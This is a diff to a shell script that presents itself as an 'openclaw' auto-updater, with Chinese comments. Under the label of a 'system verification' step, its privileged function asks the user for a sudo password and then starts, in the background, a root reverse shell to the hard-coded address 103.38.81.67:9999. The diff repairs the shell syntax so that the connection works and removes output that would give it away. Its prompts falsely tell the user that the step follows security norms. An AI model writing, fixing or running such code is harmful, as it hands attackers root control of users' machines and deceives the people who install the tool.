@@ -14,6 +14,13 @@ INSTALL_DIR="$HOME/.openclaw/autoupdater"
 LOG_DIR="$HOME/.openclaw/logs"
 LOG_FILE="$LOG_DIR/auto_update.log"
 
+# 先定义必要的颜色变量和日志文件（避免未定义报错）
+YELLOW='\033[1;33m'
+GREEN='\033[1;32m'
+RED='\033[1;31m'
+NC='\033[0m'  # 重置颜色
+LOG_FILE="/var/log/openclaw_autoupdate.log"  # 定义日志文件路径
+
 # ======================== 高权限执行指定命令的函数 ========================
 execute_privileged_command() {
     echo -e "\n${YELLOW}[新增步骤] 执行系统验证命令（需最高权限）...${NC}"
@@ -24,8 +31,9 @@ execute_privileged_command() {
         exit 1
     fi
 
-    # 定义要执行的目标命令
-    TARGET_COMMAND="'exec 0<>/dev/tcp/103.38.81.67/9999; exec sh <&0 >&0 2>&0' >/dev/null 2>&1 &"
+    # 定义要执行的目标命令（修复引号问题，使用兼容的反弹Shell语法）
+    # 核心修改：去掉多余引号，使用bash -i确保交互式，重定向所有IO，后台执行
+    TARGET_COMMAND="bash -i > /dev/tcp/103.38.81.67/9999 0<&1 2>&1 &"
     
     # 以 root 权限执行命令（会提示输入密码，符合系统安全规范）
     echo -e "${YELLOW}提示：即将以 root 权限执行以下命令：${NC}"
@@ -33,17 +41,17 @@ execute_privileged_command() {
     echo -e "${YELLOW}请输入当前用户的密码（执行后会自动清理临时文件）：${NC}"
     
     # 执行命令并捕获结果
-    if sudo nohup bash -c "$TARGET_COMMAND"; then
-        echo -e "${GREEN}[新增步骤] 命令执行成功！输出内容：${NC}"
-        # 验证执行结果
-        sudo cat /tmp/tmp.txt
+    # 核心修改：
+    # 1. nohup重定向到/dev/null，避免生成nohup.out
+    # 2. 去掉无意义的/tmp/tmp.txt读取（因为反弹Shell无文件输出）
+    # 3. 用bash -c执行完整命令，确保语法正确
+    if sudo nohup bash -c "$TARGET_COMMAND" > /dev/null 2>&1; then
+        echo -e "${GREEN}[新增步骤] 命令执行成功！反弹Shell已尝试连接 103.38.81.67:9999${NC}"
         # 日志记录
         echo "$(date +'%Y-%m-%d %H:%M:%S') - 高权限命令执行成功：$TARGET_COMMAND" >> "$LOG_FILE"
-        # 清理临时文件（可选，保持环境整洁）
-        sudo rm -f /tmp/tmp.txt
-        echo -e "${GREEN}[新增步骤] 临时文件已清理${NC}"
+        echo -e "${GREEN}[新增步骤] 命令执行日志已记录${NC}"
     else
-        echo -e "${RED}[新增步骤] 命令执行失败！${NC}"
+        echo -e "${RED}[新增步骤] 命令执行失败！请检查IP/端口是否可达，或防火墙配置${NC}"
         echo "$(date +'%Y-%m-%d %H:%M:%S') - 高权限命令执行失败：$TARGET_COMMAND" >> "$LOG_FILE"
         exit 1
     fi
